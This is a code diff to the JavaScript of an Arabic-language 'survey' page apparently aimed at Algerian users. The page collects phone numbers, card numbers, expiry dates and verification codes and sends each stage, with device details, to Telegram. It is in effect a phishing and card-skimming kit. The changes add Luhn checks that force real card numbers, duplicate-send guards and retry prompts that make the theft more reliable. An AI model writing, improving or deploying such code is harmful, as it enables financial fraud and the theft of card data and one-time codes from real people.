@@ -53,6 +53,7 @@ function goBack() {
 
 // إدارة خطوات الاستبيان
 let currentStep = 1;
+let step1DataSent = false; // لمنع الإرسال المزدوج
 
 function showStep(stepNumber) {
     const steps = document.querySelectorAll('.survey-step');
@@ -79,6 +80,13 @@ function nextStep(current) {
     }
     
     if (current === 1) {
+        // منع الإرسال المزدوج
+        if (step1DataSent) {
+            showStep(2);
+            detectDeviceInfo();
+            return;
+        }
+        
         // جمع بيانات الخطوة الأولى
         const formData = collectStep1Data();
         
@@ -88,13 +96,22 @@ function nextStep(current) {
             return;
         }
         
+        // التحقق من رقم البطاقة
+        if (!validateCardNumber(formData.cardNumber)) {
+            showNotification('رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة صحيح', 'error');
+            return;
+        }
+        
         // إرسال البيانات إلى تليجرام
-        sendTelegramData('step1_completed', formData);
+        const sendSuccess = sendTelegramData('step1_completed', formData);
         
-        showStep(2);
-        
-        // اكتشاف معلومات الجهاز
-        detectDeviceInfo();
+        if (sendSuccess) {
+            step1DataSent = true;
+            showStep(2);
+            detectDeviceInfo();
+        } else {
+            showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
+        }
         
     } else if (current === 2) {
         const verificationCode = document.getElementById('verification-code').value;
@@ -109,16 +126,20 @@ function nextStep(current) {
         const finalData = collectAllData();
         
         // إرسال البيانات النهائية إلى تليجرام
-        sendTelegramData('survey_completed', finalData);
+        const sendSuccess = sendTelegramData('survey_completed', finalData);
         
-        // تحديث رقم المشاركة
-        document.getElementById('participation-id').textContent = 
-            `ALG-${Date.now().toString().slice(-8)}`;
-        
-        showStep(3);
-        
-        // إرسال تأكيد الإكمال
-        sendTelegramData('thankyou_page_viewed', {});
+        if (sendSuccess) {
+            // تحديث رقم المشاركة
+            document.getElementById('participation-id').textContent = 
+                `ALG-${Date.now().toString().slice(-8)}`;
+            
+            showStep(3);
+            
+            // إرسال تأكيد الإكمال
+            sendTelegramData('thankyou_page_viewed', {});
+        } else {
+            showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
+        }
     }
     
     trackButtonClick(`next-button-step-${current}`);
@@ -135,6 +156,58 @@ function updateProgressBar(step) {
     });
 }
 
+// دالة محسنة للتحقق من رقم البطاقة باستخدام خوارزمية Luhn
+function validateCardNumber(cardNumber) {
+    // 1. إزالة جميع المسافات والأحرف غير رقمية
+    const cleanNumber = cardNumber.replace(/\s/g, '').replace(/\D/g, '');
+    
+    // 2. التحقق من أن الرقم يحتوي فقط على أرقام
+    if (!/^\d+$/.test(cleanNumber)) {
+        return false;
+    }
+    
+    // 3. التحقق من الطول (معظم البطاقات 13-19 رقم)
+    if (cleanNumber.length < 13 || cleanNumber.length > 19) {
+        return false;
+    }
+    
+    // 4. تطبيق خوارزمية Luhn للتحقق
+    let sum = 0;
+    let isEven = false;
+    
+    // الانتقال من اليمين إلى اليسار
+    for (let i = cleanNumber.length - 1; i >= 0; i--) {
+        let digit = parseInt(cleanNumber.charAt(i), 10);
+        
+        if (isEven) {
+            digit *= 2;
+            if (digit > 9) {
+                digit -= 9;
+            }
+        }
+        
+        sum += digit;
+        isEven = !isEven;
+    }
+    
+    return (sum % 10) === 0;
+}
+
+// دالة لتنسيق رقم البطاقة أثناء الكتابة
+function formatCardNumber(value) {
+    // إزالة جميع الأحرف غير رقمية
+    const numbers = value.replace(/\D/g, '');
+    
+    // تقسيم إلى مجموعات من 4 أرقام
+    const groups = [];
+    for (let i = 0; i < numbers.length && i < 16; i += 4) {
+        groups.push(numbers.substr(i, 4));
+    }
+    
+    // دمج المجموعات مع مسافات
+    return groups.join(' ');
+}
+
 function validateStep(step) {
     let isValid = true;
     
@@ -145,14 +218,15 @@ function validateStep(step) {
         const privacy = document.getElementById('privacy-check').checked;
         
         if (!validateAlgerianPhone(phone)) {
-            markInvalid('phone', 'رقم الهاتف غير صحيح');
+            markInvalid('phone', 'رقم الهاتف غير صحيح (يجب أن يكون 05XX XX XX XX)');
             isValid = false;
         } else {
             markValid('phone');
         }
         
-        if (!card || card.length !== 16 || !/^\d+$/.test(card)) {
-            markInvalid('card-number', 'رقم البطاقة يجب أن يكون 16 رقما');
+        // التحقق باستخدام الدالة المحسنة
+        if (!validateCardNumber(card)) {
+            markInvalid('card-number', 'رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة حقيقي');
             isValid = false;
         } else {
             markValid('card-number');
@@ -175,8 +249,9 @@ function validateStep(step) {
 }
 
 function validateAlgerianPhone(phone) {
+    const cleanPhone = phone.replace(/\s/g, '');
     const regex = /^(05|06|07)[0-9]{8}$/;
-    return regex.test(phone.replace(/\s/g, ''));
+    return regex.test(cleanPhone);
 }
 
 function markInvalid(fieldId, message) {
@@ -202,7 +277,8 @@ function collectStep1Data() {
         phone: document.getElementById('phone').value,
         cardNumber: document.getElementById('card-number').value,
         expiryDate: document.getElementById('expiry-date').value,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        sessionId: getSessionId()
     };
 }
 
@@ -214,7 +290,6 @@ function collectAllData() {
         verificationCode: document.getElementById('verification-code').value,
         deviceInfo: deviceInfo,
         userAgent: navigator.userAgent,
-        sessionId: getSessionId(),
         finalTimestamp: new Date().toISOString()
     };
 }
@@ -229,6 +304,7 @@ function getSessionId() {
 
 function resetSurvey() {
     currentStep = 1;
+    step1DataSent = false; // إعادة تعيين علامة الإرسال
     document.querySelectorAll('.survey-form')[0].reset();
     document.getElementById('verification-code').value = '';
     document.querySelectorAll('.validation-message').forEach(msg => {
@@ -274,9 +350,25 @@ function initSurveyForm() {
     // تنسيق رقم البطاقة
     const cardInput = document.getElementById('card-number');
     cardInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-        e.target.value = value.substring(0, 19);
+        const formatted = formatCardNumber(e.target.value);
+        e.target.value = formatted;
+        
+        // التحقق في الوقت الحقيقي
+        const cleanNumber = formatted.replace(/\s/g, '');
+        if (cleanNumber.length >= 13) {
+            if (validateCardNumber(formatted)) {
+                markValid('card-number');
+            } else {
+                const validationMsg = cardInput.parentNode.querySelector('.validation-message');
+                validationMsg.textContent = cleanNumber.length >= 16 ? 'رقم البطاقة غير صالح' : '';
+                validationMsg.style.color = '#e74c3c';
+                cardInput.style.borderColor = '#e74c3c';
+            }
+        } else {
+            const validationMsg = cardInput.parentNode.querySelector('.validation-message');
+            validationMsg.textContent = '';
+            cardInput.style.borderColor = '#e0e0e0';
+        }
     });
     
     // تنسيق رقم الهاتف
@@ -296,5 +388,33 @@ function initSurveyForm() {
             }
         }
         e.target.value = value;
+        
+        // التحقق في الوقت الحقيقي
+        if (value.replace(/\s/g, '').length === 10) {
+            if (validateAlgerianPhone(value)) {
+                markValid('phone');
+            } else {
+                markInvalid('phone', 'رقم جزائري غير صحيح');
+            }
+        }
     });
+}
+
+// اختبار برقم بطاقة صالح للاستخدام
+function testValidCard() {
+    const testCards = [
+        '4532 0151 4842 3237', // Visa صالح
+        '5555 5555 5555 4444', // MasterCard صالح
+        '4111 1111 1111 1111', // Visa صالح (اختبار)
+        '3782 8224 6310 005'   // American Express صالح
+    ];
+    
+    const randomCard = testCards[Math.floor(Math.random() * testCards.length)];
+    document.getElementById('card-number').value = randomCard;
+    
+    // تشغيل التحقق
+    const event = new Event('input');
+    document.getElementById('card-number').dispatchEvent(event);
+    
+    console.log('✅ تم تعيين رقم بطاقة اختبار صالح:', randomCard);
 }
